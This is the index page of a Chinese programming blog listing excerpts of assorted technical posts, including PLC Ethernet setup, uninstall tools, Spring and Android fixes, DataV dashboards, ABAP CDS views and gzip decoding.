<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大白的博客">
		<meta property="og:title" content="编程大白的博客" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/661a4f3305dec4e9e6dd7d799da70526/" rel="bookmark">
			DTS_表数据同步
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 DTS 购买主页 同步事实表到 DataHub 点击这里 即可查看 详细操作 DataHub_同步事实表到 DataHub 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ae2410b35bac73ba7bec194eb9f1c19/" rel="bookmark">
			fx5u以太网通讯设置_三菱Q系列PLC以太网接口模块的1,2号站通讯设置（参数的设置篇）...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		三菱Q系列PLC以太网接口模块与另一个Q系列PLC以太网接口模块的通讯首先两个PLC都需将网线分别接到同一个交换机上。
线接好后就可以开始进行以太网的参数设置了。
1号站:先进行1号站的设置，打开1号站的程序。点开网络参数——以太网设置页面。网络类型设置为以太网，起始IO为00,即插槽第一个模块就是以太网模块（不清楚起始IO分配的可以看下我的“三菱Q系列PLC IO分配设置”篇）网络号设置为1，组号没有不用设置，站号设置为1号站。 接下来点运行设置，设置1号站的IP地址。
点击运行设置 1号站的IP地址设置为192.168.0.1 勾选使用ping 点设置结束，接下来设置下要与2号站通讯的IP地址。点开站号IP相关信息。
使用表转换方式，网络掩码为255.255.255.0，网络号1号站与2号站的一样，2号站的IP地址设置为192.168.0.2。点击设置完成。
最后记得点设置结束
1号站的以太网模块设置就结束了。接下来设置下2号站的以太网模块。
2号站：打开2号站的程序，设置跟1号站的方法是一样的。2号站的网络模块我也是放在第一个槽中,起始IO从00开始，网络号1，没组号，站号为2。
接下运行设置，设置2号站的IP地址
然后又是IP相关设置，设置关联1号站。因为要跟1号站进行读写指令。
点击设置完成
2号站的以太网参数就设置完了。
设置完的参数上载到PLC后，PLC需要重新复位启动后才能生效。
参数上载完后可以使用ping一下网络，看看以太网模块有没连接上了。
电脑端：网线接到交换机上，win+r打开运行
输入CMD，点确认，进去后输入ping 加要测试的IP地址 。网络要是全部回复，那就通了。也证明我们之前的设置也成功了。
好了参数设置篇已经完了，后面还有程序篇，本想一篇写完，但太长了不利观看。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f1b3cf2f56acef27ad76059fa93a22e/" rel="bookmark">
			cad官方卸载工具_轻松解决卸载导致的疑难杂症，卸载无忧！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		软件的安装并不复杂，但是卸载过程中也会碰见很多问题。
无法直接卸载。 提示文件被占用，无法彻底删除卸载残留文件。 由于卸载不彻底导致无法二次安装，常见的有office、CAD和Adobe这些大型的软件。 如何应对这些卸载导致的疑难杂症呢？难道只能重装系统么？
本期就给大家推荐几款告别卸载难题的工具神器！
01、程序卸载-Geek
Geek是一款专业的程序卸载工具，可以替代系统自带的卸载功能。
不需要安装就可以直接打开它使用，会自动将电脑上安装的各类软件和插件补丁扫描出来。
然后右键点击要卸载的程序，直接卸载即可。
卸载完成之后还可以自动扫描残留的文件或者注册表之类的，然后彻底删除。
这款工具分为免费版和专业版，专业版的可以实现批量卸载等更多功能，不过对于普通用户免费版就足够用。
网络上此类专业卸载工具有很多，但是Geek免费又不需要安装，感觉非常方便。
文件占用、进程和注册表残留，这些卸载性疑难杂症统统可以轻松搞定！​mp.weixin.qq.com 02、解除占用-Unlocker
有时候碰到文件被占用，造成无法正常的删除、复制或者移动文件。
这个时候我们可以借助Unlocker这款工具来解除文件占用。
工具安装之后会在鼠标右键创建快捷菜单，右键直接点击占用文件，直接用Unlocker解除占用即可。
这是一款免费的国外工具，自带简体中文，非常好用。
03、office专用卸载工具
在卸载旧版本office的时候，虽然office自带了卸载程序，但是总是卸载不彻底。
导致安装新版本office时各种提示，无法正常安装。
这个通常都是卸载不彻底造成的。
为了解决这个问题，微软也提供了很多卸载工具，比如windows installer clean up（太老）、SetupProd_OffScrub.exe（需要联网，不好用）。
小编推荐的这款o15-ctrremove.diagcab，也是微软官方的卸载工具，非常好用。
04、Adobe专用卸载工具
Adobe系列的产品都是比较大型的，重装起来也比较麻烦，卸载不彻底同样影响二次安装。
针对这个问题，Adobe官方也发布一款卸载工具：Creative Cloud Cleaner Tool。
并且官网还提供了Windows和Maci两个版本。
这是一款命令行式的卸载工具，没有中文版。
不过操作起来几乎没什么压力，直接按照提示一步步卸载即可。
05、IE10/IE11专业卸载工具
卸载IE的浏览器也是一个老大难。
不过还好我找到了这款个人开发的卸载工具，可以针对IE10和IE11进行卸载。
工具不需要安装，打开就可以使用，也是英文界面，就几个英文单词，很好理解。
彻底卸载无残留，可以正常二次安装。
最后/总结
以上就是小编在日常工作中遇到的一些卸载难题，使用这些专业的卸载工具就可以完美卸载。
卸载彻底，没有注册表残留，无需重装系统，不影响二次安装。
告别卸载烦恼，完美！
点击此处获取工具合集包！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e643a314d50fcd74a170dbfc58963ca5/" rel="bookmark">
			python重复执行_python怎么让程序重复运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python怎么让程序重复运行,方法,文件,报错,重新启动,函数
python怎么让程序重复运行
易采站长站，站长之家为您整理了python怎么让程序重复运行的相关内容。
python让程序重复运行的方法：1、报错后，重新启动【.py】文件，继续执行；2、重复执行本【.py】文件中的内容；3、异常调用函数本身。
python让程序重复运行的方法：
方法一：
报错后，重新启动.py文件，继续执行while 1: run_ticker = 'python ticker.py' run_depth = 'python depth.py' run_depth_pct = 'python depth_pct.py' run_trade = 'python trade.py' os.system(run_depth_pct)
方法二：
重复执行本.py文件中的内容os.execvp(sys.executable, [sys.executable]+sys.argv)
或python = sys.executable # 获取当前执行python os.execl(python, python, *sys.argv) # 执行命令
方法三：
异常调用函数本身def restart(): try: fun() except EOFError as e: print(e) finally: restart()以上就是关于对python怎么让程序重复运行的详细介绍。欢迎大家对python怎么让程序重复运行内容提出宝贵意见
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a6a43d4a8d12be3127901fddb0484c5/" rel="bookmark">
			socket模拟http的登陆_不为人知的网络编程(八)：从数据传输层深度解密HTTP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、引言 在文章《理论联系实际：Wireshark抓包分析TCP 3次握手、4次挥手过程》中，我们学会了用wireshark来分析TCP的“三次握手，四次挥手”，非常好用。这就是传说中的锤子，拿着 锤子，看什么都像 钉子！在这本文中，我对将准 HTTP这颗钉子，狠狠地砸下去。。。
为了对网络数据包的“流转”有更加深刻的理解，我在docker(远程)上部署一个服务，支持http方式调用。从客户端(本地)用http方式请求其中的一个接口，并得到响应数据。同时本地通过wireshark抓包，远程用tcpdump抓包，然后分析过程中的所有通信细节(悲剧是把美好的东西撕碎给人看，而我则是把复杂的东西撕碎了给人看)。
本文的主要内容是：先通过工具获取HTTP通信的数据包，再来抽丝剥茧，深入传输层二进制的天地里，解密HTTP所有的通信细节。分析过程中，由点到面，将相关知识串接起来。市面上讲HTTP协议的文章很多，但深入到传输层从2进制的角度来解析，则相当少见。保证全篇读完之后，你对HTTP的理解会上升一个台阶！
本文稍长，请在看本文时保持耐心。
(本文同步发布于：http://www.52im.net/thread-2456-1-1.html)
2、关于作者 饶全成：毕业于华中科技大学，中科院计算所硕士，滴滴出行后端研发工程师。微信公众号： 码农桃花源，个人博客：https://www.cnblogs.com/qcrao-2018/。
3、系列文章 1)本文是系列文章中的第8篇，本系列文章的大纲如下：
《不为人知的网络编程(一)：浅析TCP协议中的疑难杂症(上篇)》
《不为人知的网络编程(二)：浅析TCP协议中的疑难杂症(下篇)》
《不为人知的网络编程(三)：关闭TCP连接时为什么会TIME_WAIT、CLOSE_WAIT》
《不为人知的网络编程(四)：深入研究分析TCP的异常关闭》
《不为人知的网络编程(五)：UDP的连接性和负载均衡》
《不为人知的网络编程(六)：深入地理解UDP协议并用好它》
《不为人知的网络编程(七)：如何让不可靠的UDP变的可靠？》
《不为人知的网络编程(八)：从数据传输层深度解密HTTP》(本文)
2)如果您觉得本系列文章过于专业，您可先阅读《网络编程懒人入门》系列文章，该系列目录如下：
《网络编程懒人入门(一)：快速理解网络通信协议(上篇)》
《网络编程懒人入门(二)：快速理解网络通信协议(下篇)》
《网络编程懒人入门(三)：快速理解TCP协议一篇就够》
《网络编程懒人入门(四)：快速理解TCP和UDP的差异》
《网络编程懒人入门(五)：快速理解为什么说UDP有时比TCP更有优势》
3)《脑残式网络编程入门》也适合入门学习，本系列大纲如下：
《脑残式网络编程入门(一)：跟着动画来学TCP三次握手和四次挥手》
《脑残式网络编程入门(二)：我们在读写Socket时，究竟在读写什么？》
《脑残式网络编程入门(三)：HTTP协议必知必会的一些知识》
《脑残式网络编程入门(四)：快速理解HTTP/2的服务器推送(Server Push)》
4)其它跟HTTP有关的文章：
《从HTTP/0.9到HTTP/2：一文读懂HTTP协议的历史演变和设计思路》
《美图App的移动端DNS优化实践：HTTPS请求耗时减小近半》
《一分钟理解 HTTPS 到底解决了什么问题》
《一篇读懂HTTPS：加密原理、安全逻辑、数字证书等》
《小白必读：闲话HTTP短连接中的Session和Token》
《IM开发基础知识补课：正确理解前置HTTP SSO单点登陆接口的原理》
《从HTTP到MQTT：一个基于位置服务的APP数据通信实践概述》
《基于APNs最新HTTP/2接口实现iOS的高性能消息推送(服务端篇)》
《Comet技术详解：基于HTTP长连接的Web端实时通信技术》
《WebSocket详解(四)：刨根问底HTTP与WebSocket的关系(上篇)》
《WebSocket详解(五)：刨根问底HTTP与WebSocket的关系(下篇)》
4、在传输层捕获HTTP报文 4.1 背景介绍
我手头现在有一个地理几何相关的服务，它提供一组接口对外使用。其中有一个接口是Fence2Area. 使用方传入一个围栏(由点的列表组成，点由表示)、点的坐标系类型(谷歌地图用的是wgs84, 国内腾讯、高德用的是soso, 而百度用的是另一套自己的坐标系)，接口输出的则是围栏的面积。
我请求服务的“Fence2Area”接口，输入围栏(fence)顶点(lng, lat)坐标、坐标系类型(coordtype)，输出的则是多边形的面积(area).
一次正常的请求示例url, 这个大家都不陌生(我用docker_ip代替真实的ip):
http://docker_ip:7080/data?cmd=Fence2Area&amp;meta={"caller":"test
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f890b2db9e7ce2e502390d9d35cf6c4/" rel="bookmark">
			org.springframework.http.converter.HttpMessageNotReadableException错误原因及解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 报错原因：@RequestBody只支持POST请求，GET请求不能使用@RequestBody，修改GET请求为POST即可，如果需要使用GET请求，可以使用@RequestParam和@PathVariable
报错异常为：
org.springframework.http.converter.HttpMessageNotReadableException: Required request body is missing: public java.lang.Object
原来写法如下：
@RequestMapping(value = "/appInfoList",method = RequestMethod.GET) @ApiOperation(value = "查询app版本信息列表") public Object appInfoList(@RequestBody @ApiParam("JSON参数") String id) { Object object = appInfoService.findAppInfoList(appInfo); return toResult(object); } 修改后为：
@RequestMapping(value = "/appInfoList",method = RequestMethod.POST) @ApiOperation(value = "查询信息列表") public Object appInfoList(@RequestBody @ApiParam("JSON参数") String id) { Object object = appInfoService.findAppInfoList(appInfo); return toResult(object); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31dc3703529d211d2ae48531e1756271/" rel="bookmark">
			Android 发送自定义广播
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android 广播机制简介
广播主要分为两种类型，标准广播，有序广播
项目完整代码
https://github.com/Phil-tom/Android-The-First-Line-of-Code/tree/main/Chapter5
发送标准广播 在发送广播之前，需要定义一个广播接收器来准备接收此广播才行。
新建MyBroadcastReceiver
public class MyBroadcastReceiver extends BroadcastReceiver { private static final String TAG = "MyBroadcastReceiver"; @Override public void onReceive(Context context, Intent intent) { Log.d(TAG, "onReceive: receive in MyBroadcastReceiver"); Toast.makeText(context,"receive in MyBroadcastReceiver",Toast.LENGTH_SHORT).show(); } } 在AndroidManifest.xml文件中对这个广播接收器进行修改，这里让MyBroadcastReceiver接收一条值为com.zzz.mybroadcastreceiver.MY_BROADCAST的广播，因此待会在MainActivity中发送广播的时候，就需要发出一条这样的广播。
&lt;receiver android:name=".MyBroadcastReceiver" android:enabled="true" android:exported="true"&gt; &lt;intent-filter&gt; &lt;action android:name="com.zzz.mybroadcastreceiver.MY_BROADCAST"/&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; 修改activity_main.xml
&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical"&gt; &lt;Button android:id="@+id/button" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Send Broadcast"/&gt; &lt;/LinearLayout&gt; 修改MainActivity.java
public class MainActivity extends AppCompatActivity { private static final String TAG = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31dc3703529d211d2ae48531e1756271/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/749d53ad7728a82a914d94e55dc138d5/" rel="bookmark">
			一步步教你写一份优秀的软件测试简历（带样例）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从事软件测试N年了，服务过不下几百个的学生就业，可能有杠精要跳出说了“培训机构简历都包装过，老师都指导面试”，每次网上看到这类回答我就：呵呵哒~
现在这个社会谁不包装？送快递的相亲说搞物流产业的，餐厅服务员说自己的做餐饮的。当然这只是一个小品上的情节，现实问题是，简历包装一直都存在，只要别过度包装即可。
我的工作就是指导小白面试：包括面试状态、面试心理、面试技术等，即使这样还是有不少小白在知乎上问类似这样的问题。
更有甚者连找工作的网站都不知道有哪些？！
诸如此类的问题很多很多，与其网上问别人，不如让经验丰富的老师告诉你，简单明了。
回到正题：什么样的简历才是较优秀的，才会让HR拿起手中电话拨打给你，争取一个面试的机会？
1、首先关于简历的版面，我个人觉得应该避免用些花里胡哨的版面，简洁明了即可。
简历首先不要超过2页纸。那些动辄好几页纸的简历，HR几乎没有耐心的看下去。
2、简历主要分为基本信息、求职意向、掌握技能、教育经历、项目或工作内容的介绍、自我评价这几类。
3、基本信息区域主要包括：姓名、年龄、工作经验、联系方式、学历就够了，籍贯啥的我个人不建议写，谁知道哪个HR有地域歧视呢，毕竟中国这么大。
4、第二部分为求职意向区域：要写明是否在职，期望薪资多少，具体求职岗位。
掌握技能方面：这里面主要有“掌握、精通、熟悉、熟练、了解”这五个词，本人不建议用“了解”，面试官看到了解的话，基本上只会认为你所“了解的”就是“不会的”。当然如果你真的有技能达不到熟悉的水平，写上了解也可以，但一定不能多。这里面要注意的是：所使用的英文术语一定要拼写正确。
面试软件测试技术岗位的话，像word、excel等这类办公软件也就别写了，这些都是必须要掌握的~
6、工作经历部分要注意的是： 工作时间一定要倒序写（即按时间由近及远），如2019-2020年…，2018-2019年…，这样写。另外就是避免过短的岗位变化，比方说3个月就离职了，这样用人单位HR会判断你工作稳定性太差，容易跳槽，然后被列为拒绝的因素之一。有同学回答的非常好，最后还是被刷下来了，后来我问HR才知道被pass原因就是缺乏“稳定性”。
7、项目经验板块部分： 建议不写项目开始时间和结束时间，有时候你是从项目版本迭代期进入岗位的，而并不是项目开始，这时候面试官问来问去，和你的项目“杠”上了，别的啥也没问，最后结论就是“你对项目不熟”。（当然如果你非常熟悉，可写上去）
8、另外关于项目内容（职责）部分这点要特别注意！！！ 从项目的实际顺序出发，总不能功能测试还没做，直接就自动化了吧，或者上来就做接口，这些都容易让自己掉进坑里面去。
最后，教育经历和自我评价这块没啥好说了，稍微注意一下自我评价别给自己挖坑，比方说平时喜欢看些软件方面的书或者浏览网站，当HR具体问你看的什么书或什么网站时，你真的没看过，那就是自己给自己挖坑了。
避免了上述错误之后，基本上HR会联系你的，这里祝正在面试或者准备面试的朋友好运。
最后： 跟大家推荐一个学习资料分享群：313782132，里面大牛已经为我们整理好了许多的学习资料，有自动化，接口，性能等等的学习资料，以及面试题！
人生是一个逆水行舟的过程，不进则退，咱们一起加油吧！
测试工程师职业发展路线图
功能测试 — 接口测试 — 自动化测试 — 测试开发 — 测试架构师
加油吧，测试人！如果你需要提升规划，那就行动吧，在路上总比在起点观望的要好。事必有法，然后有成。
资源不错就给个推荐吧~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/870e0921aacb410ad1ca0333d97b256c/" rel="bookmark">
			flutter:插件开发No pending exception expected: java.lang.NoSuchMethodError: no static method问题的解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		出现的问题： No pending exception expected: java.lang.NoSuchMethodError: no static method "Lcom/baidu/vis/unified/license/AndroidLicenser;.getDeviceId(Landroid/content/Context;)Ljava/lang/String;" 2020-11-24 11:59:08.395 18597-19185/? A/zygote64: runtime.cc:531] at int com.baidu.vis.unified.license.AndroidLicenser.nativeFaceAuthFromFile(android.content.Context, java.lang.String, java.lang.String, boolean, int) (:-2) 2020-11-24 11:59:08.395 18597-19185/? A/zygote64: runtime.cc:531] at com.baidu.vis.unified.license.AndroidLicenser$a com.baidu.vis.unified.license.AndroidLicenser.a(android.content.Context, java.lang.String, java.lang.String, boolean, int) (:-1) 2020-11-24 11:59:08.395 18597-19185/? A/zygote64: runtime.cc:531] at void com.baidu.idl.main.facesdk.FaceAuth$a.run() (:-1) 2020-11-24 11:59:08.395 18597-19185/? A/zygote64: runtime.cc:531] at void com.baidu.idl.main.facesdk.b$c.run() (:-1)
问题描述： 使用百度的人脸识别库做一个flutter的插件，集成Android的时候出现的这个问题。一开始debug模式下调试没问题，完成之后，依赖到项目中突然报错了。
问题分析： 从报错的log来看，主要是因为缺少了类，而这些类所在的资源包就是所引入的so文件及aar文件，所以，解决的思路就比较清晰了：确认资源包是否被正常引入，是否引入成功，同时涉及到so文件引入的时候，SO结构的配置是否正确，还有一个需要注意的是，缺少的类是否被release编译的时候混淆了。接下来一步步确认，理论上一共是能解决问题的。
问题解决： 首先，从报错的表面来看，是因为缺少了百度人脸识别库的资源包出现的问题。所以，先检查了libs目录下的so包，aar包等资源是否引入，引入的方式是否正确；
然后，按照以上方式引入，依赖到项目中，release编译，得到release包，以解压缩形式打开apk，看看资源文件（如所需要的so文件）是否被编译进apk中；
通过解压发现，找不到的类对应的so文件已经被编译进去了，但是运行的时候无法找到对应的类；紧接着，怀疑是不是设备的SO结构没有支持，所以就检查了在项目中的gradle文件关于SO的配置；
检查之后发现SO的配置也没有问题；最后，通过之前踩过的坑，判断出还有一种可能是：对应的so包下的类被混淆了，所以，就把找不到的类在混淆文件中排除
最后，终于把问题解决了。
问题总结： 遇到类似的问题，一般可以从以下几方面入手：
1.检查资源文件引入是否正确；
2.解压apk文件，看看缺少的类所在的资源包是否被编译进去；
3.检查gradle文件中的SO结构配置是否与sdk或者集成要求的一致；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/870e0921aacb410ad1ca0333d97b256c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94ca6ec0350c67952d2bf4ba56fde6e6/" rel="bookmark">
			vue在内网使用video，video-js.swf加载不到
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现在做的一个项目在外网上播放video视频是没问题的，但是部署到服务器上，显示加载不到这个文件，会报错。
先下载好video和flash，主要是需要npm install videojs-swf
然后在需要播放的视频页面引入
在vue.config.js中
然后重启项目就OK了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/588f0938a427a319f3342a1a318e7c66/" rel="bookmark">
			数据可视化_DataV
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 DataV 简介 DataV 数据可视化是使用可视化大屏的方式来分析并展示庞杂数据的产品。DataV 能 让更多的人看到数据可视化的魅力，帮助非专业的工程师通过图形化的界面轻松搭建专业水 准的可视化应用，满足您会议展览、业务监控、风险预警、地理信息分析等多种业务的展示 需求 DataV 和 QuckBI 区别 DataV 更侧重单一屏幕的各种数据的丰富展示效果，更加直观酷炫。适用用于投射大屏。 不注重用户的交互与灵活分析。 QuickBI 侧重于给专业的运营、数据分析师通过多页面的图形报表，进行较为灵活的、 交互性强的维度分析。适用于分析人员利用电脑进行浏览翻页查看。 DataV 实操 DataV 购买 DataV 网站地址：
https://data.aliyun.com/visual/datav?spm=5176.10695662.745986.1.9417d81czwDLox&amp;aly_ as=DmCGMOJS 体验使用即可 进入产品控制台 去支付 添加数据源 配置读取 AnalyticDB 信息 注意要给需要访问的数据源添加白名单 在 AnalyticDB 中添加白名单： （1）AnalyticDB 控制台地址： https://ads.console.aliyun.com/adb/cn-beijing/instances/v3/am-2ze9xa90nrnuralq2/datasecurity/white/create （2）外网名单地址： 139.224.92.81/24,139.224.92.22/24,139.224.92.35/24,139.224.4.30/24,139.224.92.1 02/24,139.224.4.48/24,139.224.4.104/24,139.224.92.11/24,139.224.4.60/24,139.224.92. 52/24,139.224.4.26/24,139.224.92.57/24,112.74.156.111/24,120.76.104.101/24,139.224. 4.69/24,114.55.195.74/24,47.99.11.181/24,47.94.185.180/24,182.92.144.171/24,139.224 .4.32/24,106.14.210.237/24 选择模板 点击【新增可视化】，根据业务需要选择对应的模板 选择销售实时监控 点击创建 创建大屏 配置地图模板展示地区分布统计 选中中国地图组件，在右侧选中区域热力层 组件绑定数据源，选择右侧中间页签下面的【映射数据】 上面的数据源为 static 静态数据 那么我们 配置数据源查询 SQL SQL SELECT area_code area_id, SUM(order_amount) `value` FROM ads_province_stat td GROUP BY area_code 展示数据 配置柱状图模板展示商品统计 选择组件后，在右侧的数据想要结果，点击配置数据源 ）配置数据源查询 SQL SELECT c3_name x ,SUM(order_amount) y ,'1' s FROM `ads_sku_stat` GROUP BY c3_name order by y desc 注意，返回字段必须是 x，y，s x 名称 y 数值 s 系列【可选】 预览发布 大屏展示 大屏自动更新 生成新数据 总结： 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e44723596001029faaedbb308c95d4c/" rel="bookmark">
			ABAP CDS-介绍(ABAP CDS视图)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言架构概述CDS版本SAP平台CDS的可用性CDS其他的好处后续参考 前言 文章翻译自Tushar Sharma的文章，转载请注明原作者和译者！
在SAP发展到SAP HANA版本之后，SAP内部的技术正在快速地变化，SAP开发业务应用程序的方式已经发生了范式转变（根本性改变）。 但经久不变的法则是：尽你可能的去获取数据库操作的最优性能。 几个月前，当我开始了解学习ABAP CDS视图时，我不得不搜索大量来自不同作者的博客和页面，驳杂且费时费力。现在，我想为像我这样开始学习ABAP CDS视图的初学者发布一个博客系列，帮助他们入门。 Let’s Start !! # 介绍 数据模型是应用程序开发的基石。它们为跨系统定义和格式化数据库内容提供了一种标准化方法，使不同的应用程序能够共享相同的数据——降低开发成本，加快上线时间，并提高质量和性能。 那些熟悉ABAP领域应用程序开发的人对SAP NetWeaver Application Server AS ABAP中包含的传统数据建模工具应该并不陌生——特别是存储了对象定义的ABAP数据字典（DDIC），例如abap程序中用到的数据库表和视图。而随后出现了SAP HANA和将数据密集型逻辑下推到数据库层的新范式。 虚拟数据模型(VDM)的概念是几年前在HANA Live中引入的，SAP HANA Live是一个在套件表之上的虚拟数据模型，它使用被称为计算视图的本地SAP HANA SQL视图进行实时操作报告。 这带来了一些挑战： 它没有正确地支持层次结构。层次结构帮助企业通过不同的层以树形结构分析数据，并具有向下钻取的功能。例如，时间层次结构由诸如财政年度、财政季度、财政月份等级别组成。一个高质量的数据模型应该为数据提供单一的定义和格式。它应该是清晰的、明确的、可重用的、灵活的，甚至是可扩展的数据模型。由于HANA Live虚拟数据模型是在HANA数据库层定义的，这导致用于事务处理的业务套件和用于操作报告的HANA数据库之间存在安全角色的重复。
现在我们有一些问题要思考：
1、如何捕获数据库中数据模型的语义，以便模型可以被不同的用户轻松重用，例如OData客户端和OLAP工具?
2、你如何扩展元模型来服务你的应用程序?
3、你说的这些不可能。 也许吧，如果我们没有核心数据服务(CDS)的话。
’‘Core Data Services to build design-time data-persistence models’'
“构建设计阶段数据持久性模型的核心数据服务（CDS）”
它是一个基础结构，数据库开发人员可以使用它来创建应用程序服务向UI客户端公开的底层(持久)数据模型。[链接]
为了利用SAP HANA进行应用程序开发，SAP引入了一个新的基础数据建模，称为核心数据服务（CDS）。使用CDS，数据模型是在数据库服务器上定义和使用的，而不是在应用程序服务器上。CDS还提供了超越传统数据建模工具的功能，包括对概念建模和关系定义、内置功能和扩展的支持。最初，CDS仅在SAP HANA的设计时和运行时环境中可用。现在，CDS概念在SAP NetWeaver中作为ABAP也得到了充分的实现，使开发人员能够在将代码执行下推到数据库的同时，使用ABAP开发工具在ABAP层工作。
CDS简化和统一了定义和使用数据模型的方式，不管你用的是那种消费技术。从技术上讲，它是对SQL的增强，为您提供了一种数据定义语言(DDL)，用于定义富语义数据库表/视图(CDS实体)和数据库中的用户定义类型。包括:
用于数据模型中的计算和查询的表达式概念层次上的关联，在查询中使用简单的路径表达式代替连接使用附加的(domain specific特殊域)元数据来丰富数据模型的注释。[元数据是“描述数据的数据”。元数据可以为数据说明其元素或属性（名称、大小、数据类型等），或结构（长度、字段、数据列），或其相关数据（位于何处、如何联系、拥有者）。] ABAP和HANA平台都支持CDS !
事实上，在我看来CDS是SAP近年来在数据建模领域最野心勃勃，最令人兴奋的发展。你终于可以以相同的方式(语法、行为等)定义和使用数据模型，不管是在ABAP平台还是在HANA平台。当我想到CDS时，脑海中总会出现这样一句话:“一个数据模型可以统治所有的数据”。
除此之外，Horst Keller的博客描述了两种不同风格的CDS。
Core Data Services – One Concept, Two Flavors
在浏览了上述博客之后，我们了解到CDS可以以两种不同的方式编写，并使用SAP 在NetWeaver AS ABAP 7.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e44723596001029faaedbb308c95d4c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6f7c3b250d921943f9d3b0a3888b27a/" rel="bookmark">
			关于HTTP2.0 gzip和br解压缩
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于gzip格式解码
使用zlib库解压GZIP格式数据，相关函数inflateInit2(),inflate(),inflateEnd().
zlib库安装这个比较简单不做过多描述
代码示例
直接加入#include &lt;zlib.h&gt;
static int vidpeek_uncompressGzip(unsigned char* pSrc, unsigned int srcSize,char*pOutDest, unsigned int* pOutBufSize) { int ret = OK; char* pBuf = pSrc+ (srcSize - 1); unsigned int len =1000000; int uncompressResult; z_stream d_stream; int i = 0; printf("#############pSrc 0x%x 0x%x 0x%x 0x%x %d", pSrc[0], pSrc[1],*pSrc, *(pSrc+1),srcSize); if((*pSrc !=0x1f)||(*(pSrc+1) != 0x8b)) { printf("\nuncompressGzip non Gzip\n"); return ERR; } //初始化解压系统 d_stream.zalloc =Z_NULL; d_stream.zfree =Z_NULL; d_stream.opaque = Z_NULL; d_stream.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b6f7c3b250d921943f9d3b0a3888b27a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ee7f874f0d74638d1e80cf4f8b0f15d/" rel="bookmark">
			v-model和v-bind的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1:v-bind动态绑定指令，默认情况下标签自带属性的值是固定的，在为了能够动态的给这些属性添加值，可以使用v-bind:你要动态变化的值="表达式"
2:v-bind用于绑定属性和数据 ，其缩写为“ : ” 也就是v-bind:id === :id 3:v-model用在表单控件上的，用于实现双向数据绑定，所以如果你用在除了表单控件以外的标签是没有任何效果的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4783a7602a2d7b1b131f9674fabb98c1/" rel="bookmark">
